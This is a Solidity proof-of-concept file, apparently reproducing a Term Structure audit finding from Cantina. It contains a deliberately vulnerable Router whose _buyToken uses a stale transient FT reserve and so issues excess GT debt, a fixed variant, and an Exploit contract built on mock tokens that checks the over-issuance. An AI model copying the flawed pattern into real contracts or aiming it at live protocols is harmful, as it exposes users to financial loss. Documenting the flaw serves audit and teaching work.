// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Term Structure (Cantina, February 2025).
    _buyToken reads the transient FT reserve that was snapshotted before
    market.mint. The mint has already added debtTokenAmtIn of FT, but the
    check still treats the reserve as short and _issueFtToSelf opens 160 FT
    of GT debt instead of the 60 FT that the real balance requires.
*/

contract Erc20 {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Market {
    Erc20 public debt;
    Erc20 public ft;
    Erc20 public xt;
    uint256 public issueFtFeeRatio;

    constructor(Erc20 _debt, Erc20 _ft, Erc20 _xt) {
        debt = _debt;
        ft = _ft;
        xt = _xt;
    }

    function mint(address recipient, uint256 debtTokenAmt) external {
        debt.transferFrom(msg.sender, address(this), debtTokenAmt);
        ft.mint(recipient, debtTokenAmt);
        xt.mint(recipient, debtTokenAmt);
    }
}

contract Router {
    uint256 internal constant SLOT = 0;
    Erc20 public debtToken;
    Erc20 public ft;
    Erc20 public xt;
    Erc20 public gt;
    Market public market;
    uint256 public gtDebt;
    uint256 public issued;

    constructor(Erc20 _debt, Erc20 _ft, Erc20 _xt, Erc20 _gt, Market _market) {
        debtToken = _debt;
        ft = _ft;
        xt = _xt;
        gt = _gt;
        market = _market;
    }

    function setTransientFtReserve(uint256 v) public {
        assembly {
            tstore(0, v)
        }
    }

    function getTransientFtReserve() public view returns (uint256 v) {
        assembly {
            v := tload(0)
        }
    }

    function _issueFtToSelf(uint256 ftReserve, uint256 targetFtReserve) internal {
        uint256 ftAmtToIssue = (targetFtReserve - ftReserve) * 1e18 / (1e18 - market.issueFtFeeRatio());
        issued = ftAmtToIssue;
        gtDebt += ftAmtToIssue;
        gt.mint(msg.sender, ftAmtToIssue);
        ft.mint(address(this), ftAmtToIssue);
        setTransientFtReserve(targetFtReserve);
    }

    function _buyToken(address caller, address recipient, uint256 debtTokenAmtIn, uint256 tokenAmtOut, uint256 feeAmt)
        external
        returns (uint256 netOut)
    {
        setTransientFtReserve(ft.balanceOf(address(this)));
        netOut = tokenAmtOut + debtTokenAmtIn;
        debtToken.transferFrom(caller, address(this), debtTokenAmtIn);
        debtToken.approve(address(market), debtTokenAmtIn);
        market.mint(address(this), debtTokenAmtIn);
        if (address(ft) == address(ft)) {
            uint256 ftReserve = getTransientFtReserve();
            // @> VULN: ftReserve ignores the FT minted on the line above, so extra GT debt is issued
            if (ftReserve < netOut + feeAmt) _issueFtToSelf(ftReserve, netOut + feeAmt);
        }
        ft.transfer(recipient, netOut);
    }

    function _buyTokenFixed(address caller, address recipient, uint256 debtTokenAmtIn, uint256 tokenAmtOut, uint256 feeAmt)
        external
        returns (uint256 netOut)
    {
        setTransientFtReserve(0);
        netOut = tokenAmtOut + debtTokenAmtIn;
        debtToken.transferFrom(caller, address(this), debtTokenAmtIn);
        debtToken.approve(address(market), debtTokenAmtIn);
        market.mint(address(this), debtTokenAmtIn);
        uint256 realBalance = ft.balanceOf(address(this));
        if (realBalance < netOut + feeAmt) _issueFtToSelf(realBalance, netOut + feeAmt);
        ft.transfer(recipient, netOut);
    }
}

contract Exploit {
    Erc20 public debt;
    Erc20 public ft;
    Erc20 public xt;
    Erc20 public gt;
    Market public market;
    Router public router;
    uint256 public constant DEBT_IN = 100 ether;
    uint256 public constant TOKEN_OUT = 50 ether;
    uint256 public constant FEE = 10 ether;
    uint256 public constant NET = 150 ether;
    uint256 public constant NEED = 160 ether;
    uint256 public constant FAIR_ISSUE = 60 ether;

    constructor() {
        debt = new Erc20("DEBT");
        ft = new Erc20("FT");
        xt = new Erc20("XT");
        gt = new Erc20("GT");
        market = new Market(debt, ft, xt);
        router = new Router(debt, ft, xt, gt, market);
        debt.mint(address(this), DEBT_IN);
    }

    function run() external {
        debt.approve(address(router), DEBT_IN);
        uint256 netOut = router._buyToken(address(this), address(this), DEBT_IN, TOKEN_OUT, FEE);
        require(netOut == NET, "net");
        require(ft.balanceOf(address(this)) == NET, "ft");
        require(router.issued() == NEED, "issued");
        require(gt.balanceOf(address(this)) == NEED, "debt");
        require(NEED - FAIR_ISSUE == DEBT_IN, "extra");
        require(router.getTransientFtReserve() == NEED, "tstore");
    }

    function runFixed() external {
        debt.approve(address(router), DEBT_IN);
        router._buyTokenFixed(address(this), address(this), DEBT_IN, TOKEN_OUT, FEE);
        require(router.issued() == FAIR_ISSUE, "fair");
        require(gt.balanceOf(address(this)) == FAIR_ISSUE, "gtdebt");
        require(ft.balanceOf(address(this)) == NET, "ft");
    }
}
